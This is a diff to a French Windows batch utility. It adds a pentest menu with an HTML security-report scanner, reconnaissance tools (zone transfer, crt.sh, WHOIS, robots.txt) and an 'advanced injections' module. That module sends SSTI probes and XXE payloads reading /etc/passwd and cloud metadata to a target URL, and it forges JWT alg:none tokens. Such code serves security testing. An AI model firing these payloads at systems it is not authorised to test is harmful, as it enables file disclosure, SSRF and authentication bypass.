@@ -109,7 +109,10 @@ set "t[53]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit:
 set "t[54]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs:HIDDEN"
 set "t[55]=sys_export_software:Export Liste des Logiciels~Exporte la liste de tous les programmes installes en CSV/TXT:HIDDEN"
 set "t[61]=sys_export_wifi_apps:Export Wi-Fi + Logiciels (TXT)~Genere 2 fichiers TXT sur le Bureau en un seul clic:HIDDEN"
-set "total_tools=65"
+set "t[66]=cyber_advanced_inject:Injections Avancees (SSTI/XXE/JWT)~Vecteurs modernes d'attaques serveur et API"
+set "t[67]=cyber_recon_advanced:Reconnaissance Avancee (AXFR, crt.sh, WHOIS...)~Collecte d'informations passive et active"
+set "t[68]=cyber_pentest_report:Rapport Pentest HTML Unifie~Analyse automatisee exhaustive (Vulnerability Scan)"
+set "total_tools=68"
 
 
 
@@ -1343,6 +1346,9 @@ set "opts=%opts%;Scan Fichiers Sensibles Exposes~.env, configs, backups, git, ph
 set "opts=%opts%;SQLi Avancee (Blind+Boolean+UNION)~Detection blind, time-based, error-based, UNION"
 set "opts=%opts%;Scan Sous-Domaines et Endpoints~Bruteforce DNS + API endpoints caches"
 set "opts=%opts%;Audit Authentification et Sessions~Creds defaut, timing, CSRF, bruteforce protection"
+set "opts=%opts%;Injections Avancees (SSTI/XXE/JWT)~Vecteurs modernes d'attaques serveur et API"
+set "opts=%opts%;Reconnaissance Avancee (AXFR, crt.sh, WHOIS, robots.txt)~Collecte d'informations passive et active"
+set "opts=%opts%;Rapport Pentest HTML Unifie (Scan complet + score de securite exporte en HTML)~Analyse automatisée exhaustive (Vulnerability Scan)"
 
 call :DynamicMenu "AUDIT ET CYBERSECURITE RESEAU" "!opts!"
 set "cyber_c=%errorlevel%"
@@ -1362,6 +1368,9 @@ if "%cyber_c%"=="11" goto cyber_exposed_files
 if "%cyber_c%"=="12" goto cyber_sqli_blind
 if "%cyber_c%"=="13" goto cyber_subdomain_scan
 if "%cyber_c%"=="14" goto cyber_auth_test
+if "%cyber_c%"=="15" goto cyber_advanced_inject
+if "%cyber_c%"=="16" goto cyber_recon_advanced
+if "%cyber_c%"=="17" goto cyber_pentest_report
 goto net_cyber_menu
 
 :cyber_triage
@@ -2154,6 +2163,196 @@ if exist "%ATS%" del "%ATS%"
 echo.
 pause
 goto net_cyber_menu
+
+:cyber_pentest_report
+cls
+echo.
+echo  ===========================================================
+echo   RAPPORT PENTEST HTML UNIFIE
+echo  ===========================================================
+echo.
+set /p "TARGET_URL=URL cible principale : "
+set /p "TARGET_DOMAIN=Domaine (sans https) : "
+if "%TARGET_URL%"=="" goto net_cyber_menu
+
+set "RPT_PS=%TEMP%\pentest_report.ps1"
+if exist "%RPT_PS%" del "%RPT_PS%"
+
+echo $url = "!TARGET_URL!" > "%RPT_PS%"
+echo $domain = "!TARGET_DOMAIN!" >> "%RPT_PS%"
+echo $reportFile = "$([Environment]::GetFolderPath('Desktop'))\Pentest_Report_$($domain)_$(Get-Date -Format 'yyyyMMdd_HHmm').html" >> "%RPT_PS%"
+echo $score = 100 >> "%RPT_PS%"
+echo $findings = @() >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo function Add-Finding($sev, $cat, $msg, $pts) { >> "%RPT_PS%"
+echo    $script:score -= $pts >> "%RPT_PS%"
+echo    $script:findings += [PSCustomObject]@{ Severite=$sev; Categorie=$cat; Description=$msg } >> "%RPT_PS%"
+echo } >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo Write-Host "--- Diagnostic Securite en cours pour $url ---" -f Cyan >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # 1. Headers ^& Cookies >> "%RPT_PS%"
+echo try { >> "%RPT_PS%"
+echo    $r = Invoke-WebRequest $url -Method Get -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%RPT_PS%"
+echo    $h = $r.Headers >> "%RPT_PS%"
+echo    if (-not $h['Content-Security-Policy']) { Add-Finding 'MEDIUM' 'Headers' 'CSP manquant' 10 } >> "%RPT_PS%"
+echo    if (-not $h['X-Frame-Options']) { Add-Finding 'LOW' 'Headers' 'X-Frame-Options manquant (Clickjacking)' 5 } >> "%RPT_PS%"
+echo    if ($h['Server']) { Add-Finding 'INFO' 'Infos' "Version serveur exposee : $($h['Server'])" 0 } >> "%RPT_PS%"
+echo    if ($h['X-Powered-By']) { Add-Finding 'INFO' 'Infos' "Technologie exposee : $($h['X-Powered-By'])" 0 } >> "%RPT_PS%"
+echo    $cookies = $r.Headers['Set-Cookie'] >> "%RPT_PS%"
+echo    if ($cookies) { >> "%RPT_PS%"
+echo        if ($cookies -notmatch 'HttpOnly') { Add-Finding 'MEDIUM' 'Cookies' 'Cookie(s) sans flag HttpOnly' 10 } >> "%RPT_PS%"
+echo        if ($cookies -notmatch 'Secure') { Add-Finding 'MEDIUM' 'Cookies' 'Cookie(s) sans flag Secure' 10 } >> "%RPT_PS%"
+echo        if ($cookies -notmatch 'SameSite') { Add-Finding 'LOW' 'Cookies' 'Cookie(s) sans flag SameSite' 5 } >> "%RPT_PS%"
+echo    } >> "%RPT_PS%"
+echo } catch { Write-Host "[!] Erreur lors de l'analyse des headers." -f Red } >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # 2. SSL/TLS >> "%RPT_PS%"
+echo if ($url -like 'https*') { >> "%RPT_PS%"
+echo    try { >> "%RPT_PS%"
+echo        $req = [Net.HttpWebRequest]::Create($url); $res = $req.GetResponse(); $cert = $req.ServicePoint.Certificate >> "%RPT_PS%"
+echo        $expiry = [DateTime]::Parse($cert.GetExpirationDateString()) >> "%RPT_PS%"
+echo        if ($expiry -lt (Get-Date).AddDays(30)) { Add-Finding 'HIGH' 'SSL' "Le certificat expire bientot ($expiry)" 20 } >> "%RPT_PS%"
+echo        $res.Close() >> "%RPT_PS%"
+echo    } catch { Add-Finding 'CRITICAL' 'SSL' 'Certificat SSL invalide ou expire' 40 } >> "%RPT_PS%"
+echo } >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # 3. Fichiers sensibles >> "%RPT_PS%"
+echo $critPaths = @('/.env', '/.git/config', '/wp-config.php', '/config.php', '/phpinfo.php', '/.htaccess') >> "%RPT_PS%"
+echo foreach ($p in $critPaths) { >> "%RPT_PS%"
+echo    try { >> "%RPT_PS%"
+echo        $tr = Invoke-WebRequest ($url.TrimEnd('/') + $p) -Method Get -TimeoutSec 3 -ErrorAction Stop -UseBasicParsing >> "%RPT_PS%"
+echo        if ($tr.StatusCode -eq 200) { Add-Finding 'CRITICAL' 'Fichiers' "Fichier sensible accessible : $p" 30 } >> "%RPT_PS%"
+echo    } catch {} >> "%RPT_PS%"
+echo } >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # 4. CORS ^& Methodes >> "%RPT_PS%"
+echo try { >> "%RPT_PS%"
+echo    $cors = Invoke-WebRequest $url -Method Get -Headers @{Origin='https://evil.com'} -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing >> "%RPT_PS%"
+echo    if ($cors.Headers['Access-Control-Allow-Origin'] -eq '*') { Add-Finding 'MEDIUM' 'Config' 'CORS permissif (*)' 15 } >> "%RPT_PS%"
+echo } catch {} >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # 5. Injection de base (SSTI Check) >> "%RPT_PS%"
+echo try { >> "%RPT_PS%"
+echo    $sstiUrl = $url + '?id={{7*7}}' >> "%RPT_PS%"
+echo    $sr = Invoke-WebRequest $sstiUrl -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing >> "%RPT_PS%"
+echo    if ($sr.Content -match '49') { Add-Finding 'CRITICAL' 'Injection' 'SSTI (Server-Side Template Injection) detecte' 50 } >> "%RPT_PS%"
+echo } catch {} >> "%RPT_PS%"
+echo. >> "%RPT_PS%"
+echo # Generation HTML >> "%RPT_PS%"
+echo $html = @" >> "%RPT_PS%"
+echo ^<!DOCTYPE html^>^<html lang='fr'^>^<head^>^<meta charset='UTF-8'^>^<title^>Rapport Pentest - $domain^</title^> >> "%RPT_PS%"
+echo ^<style^>body{font-family:Sans-Serif;background:#0d1117;color:#e6edf3;padding:20px}h1{color:#58a6ff}table{width:100%%;border-collapse:collapse}th{background:#161b22;padding:10px;text-align:left}td{padding:10px;border-bottom:1px solid #21262d}.HIGH{color:#f85149;font-weight:bold}.MEDIUM{color:#dbab09}.LOW{color:#3fb950}.CRITICAL{background:#f85149;color:white;padding:2px 5px;border-radius:3px}^</style^>^</head^>^<body^> >> "%RPT_PS%"
+echo ^<h1^>Rapport Pentest : $domain^</h1^>^<p^>Genere le $(Get-Date)^</p^> >> "%RPT_PS%"
+echo ^<h2^>Score de Securite : $script:score / 100^</h2^> >> "%RPT_PS%"
+echo ^<table^>^<tr^>^<th^>Severite^</th^>^<th^>Categorie^</th^>^<th^>Description^</th^>^</tr^> >> "%RPT_PS%"
+echo "@ >> "%RPT_PS%"
+echo foreach ($f in $findings) { $html += "^<tr^>^<td class='$($f.Severite)'^>$($f.Severite)^</td^>^<td^>$($f.Categorie)^</td^>^<td^>$($f.Description)^</td^>^</tr^>" } >> "%RPT_PS%"
+echo $html += "^</table^>^</body^>^</html^>" >> "%RPT_PS%"
+echo $html ^| Out-File $reportFile -Encoding UTF8 >> "%RPT_PS%"
+echo Write-Host "`n[OK] Rapport genere : $reportFile" -f Green >> "%RPT_PS%"
+echo Start-Process $reportFile >> "%RPT_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%RPT_PS%"
+if exist "%RPT_PS%" del "%RPT_PS%"
+pause
+goto net_cyber_menu
+
+:cyber_advanced_inject
+cls
+echo.
+echo  ===========================================================
+echo   INJECTIONS AVANCEES (SSTI / XXE / JWT)
+echo  ===========================================================
+echo.
+set "opts=SSTI (Server-Side Template Injection)~Injection de moteurs de templates (Jinja2, Twig, EL...);XXE (XML External Entity)~Vulnerabilite de parsing XML (File read, SSRF);JWT Attack (JSON Web Token)~Analyse, Brute-force secret et Alg:None"
+call :DynamicMenu "CHOIX DU VECTEUR D'INJECTION" "%opts%"
+set "inject_c=%errorlevel%"
+if "%inject_c%"=="0" goto net_cyber_menu
+if "%inject_c%"=="1" goto adv_ssti
+if "%inject_c%"=="2" goto adv_xxe
+if "%inject_c%"=="3" goto adv_jwt
+goto cyber_advanced_inject
+
+:adv_ssti
+cls
+echo.
+echo  [SSTI] Testeur de moteurs de templates...
+set /p "ST_URL=URL cible (ex: https://site.com/search?q=) : "
+if "%ST_URL%"=="" goto cyber_advanced_inject
+powershell -NoProfile -Command "$u='!ST_URL!'; $payloads=@{ 'Jinja2/Python'='{{7*7}}'; 'Twig/PHP'='{{7*7}}'; 'Freemarker'='${7*7}'; 'EL/Java'='${7*7}'; 'ERB/EJS'='^<%%= 7*7 %%^>'; 'Ruby Slim'='#{7*7}'; 'Spring/Thymeleaf'='__${7*7}__' }; foreach($k in $payloads.Keys){ $test=$u+$payloads[$k]; try { $r=Invoke-WebRequest $test -TimeoutSec 5 -UseBasicParsing; if($r.Content -match '49'){ Write-Host \"  [VULN] SSTI Potentiel ($k) avec payload: $($payloads[$k])\" -f Red } } catch {} }"
+pause & goto cyber_advanced_inject
+
+:adv_xxe
+cls
+echo.
+echo  [XXE] Testeur d'entites externes XML...
+set /p "XXE_URL=URL de l'endpoint XML (POST) : "
+if "%XXE_URL%"=="" goto cyber_advanced_inject
+powershell -NoProfile -Command "$u='!XXE_URL!'; $payloads=@( \"^<?xml version='1.0' encoding='ISO-8859-1'?^>^<!DOCTYPE foo [^<!ELEMENT foo ANY ^>^<!ENTITY xxe SYSTEM 'file:///etc/passwd' ^>]^>^<foo^>^&xxe;^</foo^>\", \"^<?xml version='1.0'?^>^<!DOCTYPE r [^<!ENTITY %% asd SYSTEM 'http://169.254.169.254/latest/meta-data/'^> %%asd;]^>^<r^>test^</r^>\" ); foreach($p in $payloads){ try { $r=Invoke-WebRequest $u -Method Post -Body $p -ContentType 'application/xml' -TimeoutSec 5 -UseBasicParsing; if($r.Content -match 'root:x:' -or $r.Content -match 'ami-id'){ Write-Host \"  [VULN] XXE Detecte !\" -f Red; Write-Host $r.Content.Substring(0,100) -f Gray } } catch {} }"
+pause & goto cyber_advanced_inject
+
+:adv_jwt
+cls
+echo.
+echo  [JWT] Analyse et Attaque de tokens...
+set /p "JWT_TOKEN=Entrez le token JWT : "
+if "%JWT_TOKEN%"=="" goto cyber_advanced_inject
+powershell -NoProfile -Command "$t='!JWT_TOKEN!'; $parts=$t.Split('.'); if($parts.Count -ne 3){ Write-Host 'JWT Invalide' -f Red; exit }; $header=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0].PadRight($parts[0].Length + (4 - $parts[0].Length %% 4) %% 4, '='))); $payload=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1].PadRight($parts[1].Length + (4 - $parts[1].Length %% 4) %% 4, '='))); Write-Host 'Header  : ' -NoNewline -f Cyan; Write-Host $header; Write-Host 'Payload : ' -NoNewline -f Cyan; Write-Host $payload; if($header -match '\"alg\":\"none\"'){ Write-Host '[ALERTE] Algorithme none detecte !' -f Red } else { $noneH=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('{\"alg\":\"none\",\"typ\":\"JWT\"}')).Replace('=',''); Write-Host \"Forge Alg:None -> $($noneH).$($parts[1]).\" -f Yellow }"
+pause & goto cyber_advanced_inject
+
+:cyber_recon_advanced
+cls
+echo.
+echo  ===========================================================
+echo   RECONNAISSANCE AVANCEE
+echo  ===========================================================
+echo.
+set "opts=DNS Zone Transfer (AXFR)~Tente de lister tous les sous-domaines via les serveurs NS;Certificate Transparency (crt.sh)~Recherche tous les sous-domaines via les certificats publics;WHOIS ^& ASN Lookup~Informations de propriete et routage;Robots.txt ^& Sitemap Scraping~Exploration des chemins declares non-indexes"
+call :DynamicMenu "OUTILS DE RECONNAISSANCE" "%opts%"
+set "recon_c=%errorlevel%"
+if "%recon_c%"=="0" goto net_cyber_menu
+if "%recon_c%"=="1" goto recon_axfr
+if "%recon_c%"=="2" goto recon_crtsh
+if "%recon_c%"=="3" goto recon_whois
+if "%recon_c%"=="4" goto recon_robots
+goto cyber_recon_advanced
+
+:recon_axfr
+cls
+echo.
+echo  [AXFR] Tentative de transfert de zone...
+set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
+if "%AX_DOM%"=="" goto cyber_recon_advanced
+powershell -NoProfile -Command "$d='!AX_DOM!'; $ns=Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue; foreach($srv in $ns.NameHost){ Write-Host \"  Test sur $srv...\" -f Gray; nslookup -type=any -timeout=5 $d $srv | Select-String \"$d\" | ForEach-Object { Write-Host $_ -f Green } }"
+pause & goto cyber_recon_advanced
+
+:recon_crtsh
+cls
+echo.
+echo  [crt.sh] Recherche de sous-domaines via certificats SSL...
+set /p "CRT_DOM=Domaine cible : "
+if "%CRT_DOM%"=="" goto cyber_recon_advanced
+powershell -NoProfile -Command "$d='!CRT_DOM!'; $url=\"https://crt.sh/?q=%%.$d^&output=json\"; try { $r=Invoke-WebRequest $url -TimeoutSec 15 -UseBasicParsing; $json=$r.Content | ConvertFrom-Json; $json | Select-Object -ExpandProperty common_name -Unique | Sort-Object | ForEach-Object { Write-Host \"  [+] $_\" -f Green } } catch { Write-Host 'Erreur de connexion a crt.sh' -f Red }"
+pause & goto cyber_recon_advanced
+
+:recon_whois
+cls
+echo.
+echo  [WHOIS] Information de domaine...
+set /p "WH_DOM=Domaine ou IP : "
+if "%WH_DOM%"=="" goto cyber_recon_advanced
+powershell -NoProfile -Command "whois !WH_DOM! 2>$null; if($? -eq $false){ Invoke-WebRequest \"https://rdap.org/domain/!WH_DOM!\" -UseBasicParsing | ConvertFrom-Json | Select-Object -Property ldhName, status, entities | Format-List; Write-Host 'Donnees RDAP (WHOIS Moderne) recuperees.' -f Cyan }"
+pause & goto cyber_recon_advanced
+
+:recon_robots
+cls
+echo.
+echo  [ROBOTS] Scraping de robots.txt et sitemap.xml...
+set /p "RB_URL=URL (ex: https://google.com) : "
+if "%RB_URL%"=="" goto cyber_recon_advanced
+powershell -NoProfile -Command "$u='!RB_URL!'.TrimEnd('/'); foreach($p in @('/robots.txt', '/sitemap.xml')){ try { $r=Invoke-WebRequest ($u+$p) -TimeoutSec 5 -UseBasicParsing; Write-Host \"--- $p --- \" -f Blue; $r.Content; Write-Host \"----------------\" -f Blue } catch {} }"
+pause & goto cyber_recon_advanced
 
 
 :cyber_security_report
